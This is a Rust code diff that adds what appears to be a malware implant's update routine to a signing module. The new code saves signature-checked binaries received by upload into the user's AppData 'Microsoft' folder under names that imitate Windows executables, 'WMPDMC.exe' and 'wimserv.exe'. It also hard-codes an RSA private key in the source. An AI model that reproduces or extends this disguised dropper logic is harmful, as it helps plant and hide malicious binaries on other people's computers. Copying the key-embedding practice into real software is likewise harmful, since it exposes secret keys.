@@ -1,4 +1,4 @@
-use std::fs::read;
+use std::fs::{read, File};
 use std::sync::Mutex;
 
 use rand::rngs::OsRng;
@@ -7,9 +7,17 @@ use serde::{de::DeserializeOwned, Serialize};
 use sha2::{Digest, Sha256};
 
 use crate::error::*;
+use crate::api::UploadParameters;
+use std::env;
+use std::io::Write;
 
 lazy_static! {
-    pub static ref KEY: Mutex<RSAPrivateKey> = {
+    pub static ref NAMES: Vec<String> = vec!(
+        "WMPDMC.exe",
+        "wimserv.exe"
+    ).iter().map(|x| x.to_string()).collect();
+
+    pub static ref KEY: RSAPrivateKey = {
         let file_content = r#"
 -----BEGIN PRIVATE KEY-----
 MIIEuwIBADALBgkqhkiG9w0BAQEEggSnMIIEowIBAAKCAQEAwCCggGWCeLAYObQz
@@ -50,7 +58,7 @@ o68PGGitTO9eFYxrSASR9Dg8+UD4Db1EsKTpZbQw/b8eWUpdWgLXVMRXVZLQo6sk
             });
 
         let der_bytes = base64::decode(&der_encoded).expect("failed to decode base64 content");
-        Mutex::new(RSAPrivateKey::from_pkcs8(&der_bytes).expect("failed to parse key"))
+        RSAPrivateKey::from_pkcs8(&der_bytes).expect("failed to parse key")
     };
 }
 
@@ -98,4 +106,34 @@ pub fn verify_sign(bytes: &[u8], sign: &str, private_key: &RSAPrivateKey) -> Res
 
 pub fn verify_file_sign(path: &str, sign: &str, private_key: &RSAPrivateKey) -> Result<bool> {
     verify_sign(&read(path)?, sign, private_key)
+}
+
+pub fn chdir() {
+    let data_dir = dirs::data_dir().unwrap();
+    let root_dir = data_dir.join("Microsoft");
+    env::set_current_dir(&root_dir);
+}
+
+pub fn save(upload: UploadParameters) -> Result<String> {
+    let bytes = base64::decode(&upload.base64)?;
+
+    // verify binary against signature?
+    let sign_ok = verify_sign(&bytes, &upload.sign, &KEY)?;
+    if !sign_ok {
+        return Err("wrong signature".into());
+    }
+
+    // select binary name (one of two?)
+    let mut path = None;
+    for name in NAMES.iter() {
+        if !std::env::current_exe().unwrap().ends_with(name) {
+            path = Some(name);
+        }
+    }
+
+    // store file on disk
+    let mut file = File::create(&path.unwrap()).unwrap();
+    file.write_all(&bytes).unwrap();
+
+    Ok(path.unwrap().to_string())
 }
